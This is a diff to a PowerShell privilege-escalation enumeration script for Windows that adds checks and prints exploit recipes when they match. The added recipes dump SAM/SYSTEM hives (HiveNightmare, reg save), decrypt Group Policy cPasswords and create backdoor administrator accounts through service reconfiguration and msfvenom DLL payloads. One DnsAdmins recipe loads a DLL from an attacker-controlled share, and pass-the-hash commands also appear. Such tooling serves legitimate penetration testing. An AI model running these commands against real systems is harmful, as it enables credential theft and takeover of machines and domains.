@@ -9,7 +9,7 @@
 # ============================================================================
 #  Windows Privilege Escalation Enumeration Tool
 #  Author : Pentest-Ready
-#  Version: 1.1
+#  Version: 1.2
 #  Usage  : powershell -ep bypass -File privy.ps1
 # ============================================================================
 
@@ -46,7 +46,7 @@ function Banner {
     Write-Host "   #       #    #   #     # #      #" -ForegroundColor Cyan
     Write-Host "   #       #     # ####    #       #" -ForegroundColor Cyan
     Write-Host "  ============================================================================" -ForegroundColor Cyan
-    Write-Host "   Windows Privilege Escalation Enumeration Tool v1.1" -ForegroundColor Yellow
+    Write-Host "   Windows Privilege Escalation Enumeration Tool v1.2" -ForegroundColor Yellow
     Write-Host "  ============================================================================`n" -ForegroundColor Cyan
 }
 
@@ -161,6 +161,14 @@ Run-Cmd "ipconfig" { ipconfig /all } $sys
 Sub-Header "Environment Variables" $sys
 Run-Cmd "env" { Get-ChildItem Env: | Format-Table -AutoSize } $sys
 
+Sub-Header "PowerShell Language Mode" $sys
+$psLangMode = $ExecutionContext.SessionState.LanguageMode
+Add-Content $sys "  LanguageMode: $psLangMode"
+Add-Content $sys "  PSVersion: $($PSVersionTable.PSVersion)"
+if ($psLangMode -eq "ConstrainedLanguage") {
+    Finding "PowerShell is in ConstrainedLanguage mode -- many .NET methods/cmdlets are restricted" $sys
+}
+
 Sub-Header "Hotfixes / Patches" $sys
 Run-Cmd "Installed Hotfixes" { Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 30 | Format-Table -AutoSize } $sys
 
@@ -206,6 +214,33 @@ foreach ($priv in $dangerousPrivs.Keys) {
             Finding "$priv is ENABLED -- $($dangerousPrivs[$priv])" $ugo
         } else {
             Finding "$priv present (disabled) -- may be enableable: $($dangerousPrivs[$priv])" $ugo
+        }
+    }
+}
+
+Sub-Header "High-Privilege Group Membership" $ugo
+$whoamiGroups = whoami /groups 2>$null | Out-String
+$privGroups = @{
+    "Backup Operators"        = "Read SAM/SYSTEM hives via reg save (SeBackupPrivilege)"
+    "Server Operators"        = "Modify services -> SYSTEM"
+    "Print Operators"         = "Load drivers, manage Print Spooler"
+    "Hyper-V Administrators"  = "Hyper-V escape paths possible"
+    "Account Operators"       = "Modify non-admin user accounts"
+    "DnsAdmins"               = "Load DLL via dnscmd /config /serverlevelplugindll -> SYSTEM on DC"
+    "Schema Admins"           = "Modify AD schema (forest-wide)"
+    "Enterprise Admins"       = "Forest-wide admin (effectively DA+)"
+    "Domain Admins"           = "Full domain control"
+    "Group Policy Creator Owners" = "Create/modify GPOs -> domain-wide code execution"
+    "Protected Users"         = "(defensive) cred theft mitigations enabled for this user"
+}
+$privGroupHits = @()
+foreach ($g in $privGroups.Keys) {
+    if ($whoamiGroups -match [regex]::Escape($g)) {
+        $privGroupHits += $g
+        if ($g -ne "Protected Users") {
+            Finding "Member of high-privilege group: $g -- $($privGroups[$g])" $ugo
+        } else {
+            Add-Content $ugo "  [info] User is in 'Protected Users' -- LSASS cred theft is harder"
         }
     }
 }
@@ -271,6 +306,32 @@ Get-WmiObject Win32_Service | Where-Object { $_.PathName } | ForEach-Object {
             } | ForEach-Object {
                 Add-Content $svc "  [WRITABLE BINARY] $binPath ($($_.IdentityReference) - $($_.FileSystemRights))"
                 Finding "Writable service binary: $binPath -- replace with payload for SYSTEM on restart" $svc
+            }
+        }
+    }
+}
+
+Sub-Header "Writable Service Directories (DLL hijack)" $svc
+Write-Host "    Checking service binary directories for writability..." -ForegroundColor Cyan
+$writableSvcDirs = @()
+$checkedDirs = @{}
+Get-WmiObject Win32_Service | Where-Object { $_.PathName } | ForEach-Object {
+    $svcName = $_.Name
+    $binPath = ($_.PathName -replace '"','').Split(' ')[0]
+    if ($binPath -and (Test-Path $binPath)) {
+        $binDir = Split-Path $binPath -Parent
+        if ($binDir -and -not $checkedDirs.ContainsKey($binDir) -and $binDir -notmatch '^C:\\Windows') {
+            $checkedDirs[$binDir] = $true
+            $dirAcl = Get-Acl $binDir -ErrorAction SilentlyContinue
+            if ($dirAcl) {
+                $dirAcl.Access | Where-Object {
+                    $_.IdentityReference -match "Everyone|Users|Authenticated Users|BUILTIN\\Users" -and
+                    $_.FileSystemRights -match "Write|FullControl|Modify"
+                } | ForEach-Object {
+                    $writableSvcDirs += "$binDir (service: $svcName)"
+                    Add-Content $svc "  [WRITABLE SVC DIR] $binDir (service: $svcName, $($_.IdentityReference) - $($_.FileSystemRights))"
+                    Finding "Writable service directory: $binDir (service: $svcName) -- DLL hijack possible" $svc
+                }
             }
         }
     }
@@ -356,6 +417,18 @@ if ($puttyPass) {
 
 Sub-Header "LSA Cached Credentials" $reg
 Run-Cmd "CachedLogonsCount" { (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").CachedLogonsCount } $reg
+
+Sub-Header "LSA Protection / Credential Guard" $reg
+$lsaProtection = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL
+$credGuard = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LsaCfgFlags -ErrorAction SilentlyContinue).LsaCfgFlags
+Add-Content $reg "  RunAsPPL (LSA Protection): $lsaProtection"
+Add-Content $reg "  LsaCfgFlags (Credential Guard): $credGuard"
+if (-not $lsaProtection -or $lsaProtection -eq 0) {
+    Add-Content $reg "  [info] LSA Protection NOT enabled -- LSASS dumping not blocked by PPL"
+}
+if ($credGuard -eq 1 -or $credGuard -eq 2) {
+    Add-Content $reg "  [info] Credential Guard enabled -- LSASS hashes/tickets isolated in VBS"
+}
 
 Sub-Header "UAC Configuration" $reg
 Run-Cmd "UAC Level" { Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" | Select-Object EnableLUA, ConsentPromptBehaviorAdmin, LocalAccountTokenFilterPolicy | Format-List } $reg
@@ -528,14 +601,14 @@ foreach ($bp in $browserPaths) {
 Sub-Header "Password Search in Common Locations" $creds
 Run-Cmd "findstr password in C:\Users" {
     Get-ChildItem "$env:USERPROFILE" -Recurse -Include "*.txt","*.ini","*.cfg","*.config","*.xml","*.ps1","*.bat","*.cmd" -ErrorAction SilentlyContinue |
-    Select-String -Pattern "password|passwd|pwd" -CaseSensitive:$false -ErrorAction SilentlyContinue |
-    Select-Object -First 20 | Format-Table Path,LineNumber,Line -AutoSize
+    Select-String -Pattern "password|passwd|pwd|api[_-]?key|secret|token" -CaseSensitive:$false -ErrorAction SilentlyContinue |
+    Select-Object -First 20 Path,LineNumber,Line | Out-String -Width 500
 } $creds
 
 Run-Cmd "findstr password in C:\xampp" {
     Get-ChildItem "C:\xampp" -Recurse -Include "*.php","*.ini","*.conf","*.config" -ErrorAction SilentlyContinue |
     Select-String -Pattern "password|passwd|pwd" -CaseSensitive:$false -ErrorAction SilentlyContinue |
-    Select-Object -First 20 | Format-Table Path,LineNumber,Line -AutoSize
+    Select-Object -First 20 Path,LineNumber,Line | Out-String -Width 500
 } $creds
 
 Sub-Header "SAM / SYSTEM Hives" $creds
@@ -543,6 +616,50 @@ Run-Cmd "Check SAM accessibility" {
     $items = @("C:\Windows\System32\config\SAM","C:\Windows\System32\config\SYSTEM","C:\Windows\System32\config\SECURITY")
     foreach ($i in $items) { if (Test-Path $i) { "EXISTS: $i" } }
 } $creds
+
+Sub-Header "HiveNightmare / SeriousSAM (CVE-2021-36934)" $creds
+$hiveNightmare = $false
+$samAcl = icacls "C:\Windows\System32\config\SAM" 2>$null | Out-String
+Add-Content $creds "  icacls SAM:"
+Add-Content $creds $samAcl
+if ($samAcl -match "BUILTIN\\Users:.*\(R") {
+    $hiveNightmare = $true
+    Finding "SAM hive readable by Users (CVE-2021-36934 HiveNightmare) -- dump via VSS shadow copy!" $creds
+}
+
+Sub-Header "Group Policy Preferences (cPassword)" $creds
+$gppFound = $false
+$gpPaths = @(
+    "C:\ProgramData\Microsoft\Group Policy\History",
+    "C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\History"
+)
+foreach ($gp in $gpPaths) {
+    if (Test-Path $gp) {
+        Get-ChildItem $gp -Recurse -Include "Groups.xml","Services.xml","Scheduledtasks.xml","DataSources.xml","Printers.xml","Drives.xml" -ErrorAction SilentlyContinue | ForEach-Object {
+            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
+            if ($content -match 'cpassword="[^"]+"') {
+                $gppFound = $true
+                Add-Content $creds "  [GPP] $($_.FullName)"
+                Add-Content $creds $content
+                Finding "GPP cPassword found in $($_.FullName) -- decrypt with gpp-decrypt!" $creds
+            }
+        }
+    }
+}
+
+Sub-Header "Saved RDP Connection Files" $creds
+$rdpFiles = @()
+foreach ($searchDir in @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","C:\Users\Public")) {
+    if (Test-Path $searchDir) {
+        Get-ChildItem $searchDir -Recurse -Filter "*.rdp" -ErrorAction SilentlyContinue | ForEach-Object {
+            $rdpFiles += $_.FullName
+            Run-Cmd "$($_.FullName)" { Get-Content $_.FullName } $creds
+        }
+    }
+}
+if ($rdpFiles.Count -gt 0) {
+    Finding "$($rdpFiles.Count) saved .rdp file(s) found -- check for stored credentials/targets" $creds
+}
 
 Sub-Header "DPAPI Master Keys" $creds
 Run-Cmd "DPAPI masterkeys" { Get-ChildItem "$env:APPDATA\Microsoft\Protect" -Recurse -ErrorAction SilentlyContinue } $creds
@@ -898,6 +1015,97 @@ if ($uac.LocalAccountTokenFilterPolicy -eq 1) {
     evil-winrm -i <target> -u Administrator -H <NTLM_hash>
     nxc smb <target> -u Administrator -H <NTLM_hash> -x "whoami"
     impacket-psexec Administrator@<target> -hashes :<NTLM_hash>
+"@
+}
+
+# -- P1: HiveNightmare / SeriousSAM ----------------------------------------
+if ($hiveNightmare) {
+    Exploit-Entry "P1" "HiveNightmare (CVE-2021-36934) -- SAM/SYSTEM/SECURITY readable by Users" @"
+  Dump hives from a VSS shadow copy (which inherits the bad ACL):
+    vssadmin list shadows
+    # Read SAM/SYSTEM/SECURITY from \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\System32\config\
+  Or use HiveNightmare PoC:
+    https://github.com/GossiTheDog/HiveNightmare
+    .\HiveNightmare.exe
+  Then offline:
+    python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
+"@
+}
+
+# -- P1: GPP cPassword -----------------------------------------------------
+if ($gppFound) {
+    Exploit-Entry "P1" "GPP cPassword (CVE-2014-1812) found in Group Policy XML" @"
+  Microsoft published the AES key, so cpasswords are trivially decryptable:
+    gpp-decrypt '<base64_cpassword>'
+  Or with PowerShell:
+    https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
+    Get-GPPPassword
+  Credentials are usually domain accounts -- try them broadly with nxc.
+"@
+}
+
+# -- P1: High-privilege group memberships ----------------------------------
+foreach ($g in $privGroupHits) {
+    switch -Regex ($g) {
+        "Backup Operators" {
+            Exploit-Entry "P1" "Member of: Backup Operators" @"
+  Read SAM/SYSTEM hives via reg save (SeBackupPrivilege is implicit):
+    reg save HKLM\SAM C:\Temp\SAM
+    reg save HKLM\SYSTEM C:\Temp\SYSTEM
+  Extract offline: secretsdump.py -sam SAM -system SYSTEM LOCAL
+  On a DC: https://github.com/mpgn/BackupOperatorToDA
+"@
+        }
+        "Server Operators" {
+            Exploit-Entry "P1" "Member of: Server Operators" @"
+  Modify any service binary path to your payload, then start it as SYSTEM:
+    sc config <svc> binPath= "cmd /c net user hacker P@ssw0rd /add && net localgroup Administrators hacker /add"
+    sc start <svc>
+"@
+        }
+        "DnsAdmins" {
+            Exploit-Entry "P1" "Member of: DnsAdmins (likely on DC)" @"
+  Load arbitrary DLL into the DNS service (runs as SYSTEM on the DC):
+    msfvenom -p windows/x64/exec CMD='net user hacker P@ssw0rd /add' -f dll -o evil.dll
+    Place evil.dll on a share readable by the DC.
+    dnscmd <dc> /config /serverlevelplugindll \\<attacker>\share\evil.dll
+    sc \\<dc> stop dns && sc \\<dc> start dns
+"@
+        }
+        "Hyper-V Administrators" {
+            Exploit-Entry "P2" "Member of: Hyper-V Administrators" @"
+  Mount VHDX of a VM containing creds, or attach a malicious VHD.
+  Research path; less canned exploit than other groups.
+"@
+        }
+        "Print Operators" {
+            Exploit-Entry "P2" "Member of: Print Operators" @"
+  Can load printer drivers (SeLoadDriverPrivilege effectively):
+    Check BYOVD path: https://github.com/TarlogicSecurity/EoPLoadDriver
+"@
+        }
+    }
+}
+
+# -- P2: Writable service directory (DLL hijack) --------------------------
+if ($writableSvcDirs.Count -gt 0) {
+    Exploit-Entry "P2" "Writable service binary directory -- DLL hijack" @"
+  Drop a DLL with a name the service loads (use Procmon on attacker side to identify) into the writable dir.
+  When the service starts/restarts, your DLL is loaded as SYSTEM.
+  Generate a payload DLL:
+    msfvenom -p windows/x64/exec CMD='net user h P@ss /add' -f dll -o <name>.dll
+  Writable dirs:
+$(($writableSvcDirs | ForEach-Object { "    -> $_" }) -join "`n")
+"@
+}
+
+# -- P3: Saved RDP files ---------------------------------------------------
+if ($rdpFiles.Count -gt 0) {
+    Exploit-Entry "P3" ".rdp files found -- check for cached credentials" @"
+  RDP files reference targets and may have stored creds (DPAPI-protected blob).
+  Decrypt with: https://github.com/Hackndo/dpapi-tools or SharpDPAPI.
+  Files:
+$(($rdpFiles | ForEach-Object { "    -> $_" }) -join "`n")
 "@
 }
 
